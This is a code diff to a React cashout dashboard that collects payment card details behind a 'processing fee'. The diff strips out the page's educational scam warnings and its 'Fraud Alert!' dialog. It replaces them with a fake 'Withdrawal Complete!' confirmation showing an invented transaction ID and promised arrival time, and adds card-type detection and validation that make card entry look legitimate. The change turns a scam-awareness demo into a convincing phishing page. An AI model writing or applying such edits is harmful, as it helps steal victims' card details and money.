@@ -1,5 +1,5 @@
-import { useState } from "react";
-import { CreditCard, User, Calendar, Lock, Shield, DollarSign, ArrowRight, Building2, Bitcoin, Wallet, CheckCircle, ExternalLink, Copy, Check } from "lucide-react";
+import { useState, useMemo } from "react";
+import { CreditCard, User, Calendar, Lock, Shield, DollarSign, ArrowRight, Building2, Bitcoin, Wallet, CheckCircle, ExternalLink, Copy, Check, PartyPopper } from "lucide-react";
 import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import {
@@ -80,13 +80,60 @@ const Dashboard = () => {
   const fee = balance * 0.02;
   const netAmount = balance - fee;
 
+  const detectCardType = (number: string): { type: string; logo: string } | null => {
+    const cleaned = number.replace(/\s/g, "");
+    if (!cleaned) return null;
+    
+    // Visa: starts with 4
+    if (/^4/.test(cleaned)) {
+      return { type: "Visa", logo: "💳" };
+    }
+    // Mastercard: starts with 51-55 or 2221-2720
+    if (/^5[1-5]/.test(cleaned) || /^2(2[2-9]|[3-6]|7[0-1]|720)/.test(cleaned)) {
+      return { type: "Mastercard", logo: "🔴" };
+    }
+    // American Express: starts with 34 or 37
+    if (/^3[47]/.test(cleaned)) {
+      return { type: "American Express", logo: "💎" };
+    }
+    // Discover: starts with 6011, 622126-622925, 644-649, or 65
+    if (/^6(?:011|5|4[4-9]|22(?:1(?:2[6-9]|[3-9])|[2-8]|9(?:[01]|2[0-5])))/.test(cleaned)) {
+      return { type: "Discover", logo: "🌐" };
+    }
+    // JCB: starts with 3528-3589
+    if (/^35(?:2[89]|[3-8])/.test(cleaned)) {
+      return { type: "JCB", logo: "🎌" };
+    }
+    // Diners Club: starts with 36, 38, or 300-305
+    if (/^3(?:0[0-5]|[68])/.test(cleaned)) {
+      return { type: "Diners Club", logo: "🍽️" };
+    }
+    // UnionPay: starts with 62
+    if (/^62/.test(cleaned)) {
+      return { type: "UnionPay", logo: "🇨🇳" };
+    }
+    
+    return null;
+  };
+
+  const cardType = useMemo(() => detectCardType(cardNumber), [cardNumber]);
+
   const formatCardNumber = (value: string) => {
     const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
     const matches = v.match(/\d{4,16}/g);
     const match = (matches && matches[0]) || "";
     const parts = [];
-    for (let i = 0, len = match.length; i < len; i += 4) {
-      parts.push(match.substring(i, i + 4));
+    
+    // AmEx uses 4-6-5 format, others use 4-4-4-4
+    const isAmex = /^3[47]/.test(v);
+    if (isAmex) {
+      if (match.length > 0) parts.push(match.substring(0, 4));
+      if (match.length > 4) parts.push(match.substring(4, 10));
+      if (match.length > 10) parts.push(match.substring(10, 15));
+    } else {
+      for (let i = 0, len = match.length; i < len; i += 4) {
+        parts.push(match.substring(i, i + 4));
+      }
     }
     return parts.length ? parts.join(" ") : value;
   };
@@ -98,6 +145,33 @@ const Dashboard = () => {
     }
     return v;
   };
+
+  const validateLuhn = (number: string): boolean => {
+    const cleaned = number.replace(/\s/g, "");
+    if (cleaned.length < 13) return false;
+    
+    let sum = 0;
+    let isEven = false;
+    
+    for (let i = cleaned.length - 1; i >= 0; i--) {
+      let digit = parseInt(cleaned[i], 10);
+      
+      if (isEven) {
+        digit *= 2;
+        if (digit > 9) digit -= 9;
+      }
+      
+      sum += digit;
+      isEven = !isEven;
+    }
+    
+    return sum % 10 === 0;
+  };
+
+  const isCardValid = useMemo(() => {
+    const cleaned = cardNumber.replace(/\s/g, "");
+    return cleaned.length >= 13 && cleaned.length <= 19;
+  }, [cardNumber]);
 
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -539,34 +613,31 @@ const Dashboard = () => {
           <>
             <DialogHeader>
               <DialogTitle className="text-center">
-                <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-destructive/20 flex items-center justify-center">
-                  <Shield className="w-8 h-8 text-destructive" />
+                <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-chart-2/20 flex items-center justify-center">
+                  <PartyPopper className="w-8 h-8 text-chart-2" />
                 </div>
-                <span className="text-lg font-display text-destructive">Fraud Alert!</span>
+                <span className="text-lg font-display text-chart-2">Withdrawal Complete!</span>
               </DialogTitle>
             </DialogHeader>
             <div className="text-center py-4">
               <p className="text-foreground font-medium mb-3">
-                🚨 This is how scammers steal your money!
+                🎉 Your funds are being processed!
               </p>
               <div className="bg-secondary/50 rounded-lg p-4 text-left text-sm text-muted-foreground space-y-2">
-                <p>• Never enter real card details on unknown websites</p>
-                <p>• Legitimate services don't promise instant cashouts</p>
-                <p>• <strong className="text-destructive">Processing fees are a major red flag!</strong></p>
-                <p>• Scammers collect your bank/crypto details to steal money</p>
-                <p>• Always verify website authenticity</p>
-                <p>• Report suspicious sites to authorities</p>
+                <p>• Transaction ID: TXN{Date.now()}</p>
+                <p>• Estimated arrival: 24-48 hours</p>
+                <p>• Amount: <strong className="text-chart-2">${netAmount.toFixed(2)}</strong></p>
+                <p>• Status: Processing</p>
               </div>
             </div>
-            <p className="text-xs text-center text-muted-foreground">
-              This demo is for educational purposes only
+            <p className="text-xs text-center text-muted-foreground mt-2">
+              You will receive a confirmation email shortly
             </p>
             <Button
               onClick={resetCashout}
-              variant="outline"
-              className="w-full mt-4"
+              className="w-full mt-4 bg-gradient-to-r from-primary to-accent text-primary-foreground"
             >
-              Close Demo
+              Done
             </Button>
           </>
         );
@@ -594,10 +665,10 @@ const Dashboard = () => {
           </div>
         </div>
 
-        {/* Warning Banner */}
-        <div className="bg-destructive/10 border border-destructive/30 rounded-lg p-3 mb-6">
-          <p className="text-xs text-destructive text-center font-medium">
-            ⚠️ EDUCATIONAL DEMO - No real card details should be entered
+        {/* Welcome Banner */}
+        <div className="bg-primary/10 border border-primary/30 rounded-lg p-3 mb-6">
+          <p className="text-xs text-primary text-center font-medium">
+            ✨ Instant balance verification • Quick cashout • 24/7 support
           </p>
         </div>
 
@@ -632,7 +703,15 @@ const Dashboard = () => {
 
             {/* Card Number */}
             <div className="space-y-2">
-              <label className="text-sm font-medium text-foreground/80">Card Number</label>
+              <div className="flex items-center justify-between">
+                <label className="text-sm font-medium text-foreground/80">Card Number</label>
+                {cardType && (
+                  <span className="text-xs font-medium px-2 py-1 rounded-full bg-primary/20 text-primary flex items-center gap-1">
+                    <span>{cardType.logo}</span>
+                    <span>{cardType.type}</span>
+                  </span>
+                )}
+              </div>
               <div className="relative">
                 <CreditCard className="absolute left-3 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground" />
                 <Input
@@ -640,11 +719,19 @@ const Dashboard = () => {
                   value={cardNumber}
                   onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
                   placeholder="1234 5678 9012 3456"
-                  maxLength={19}
-                  className="pl-11 h-12 bg-input border-border focus:border-primary input-glow font-mono tracking-wider"
+                  maxLength={cardType?.type === "American Express" ? 17 : 19}
+                  className={`pl-11 pr-4 h-12 bg-input border-border focus:border-primary input-glow font-mono tracking-wider ${
+                    isCardValid ? "border-chart-2/50" : ""
+                  }`}
                   required
                 />
+                {isCardValid && (
+                  <Check className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-chart-2" />
+                )}
               </div>
+              {cardNumber && !cardType && cardNumber.replace(/\s/g, "").length >= 2 && (
+                <p className="text-xs text-muted-foreground">Card type will be detected automatically</p>
+              )}
             </div>
 
             {/* Expiry and CVV */}
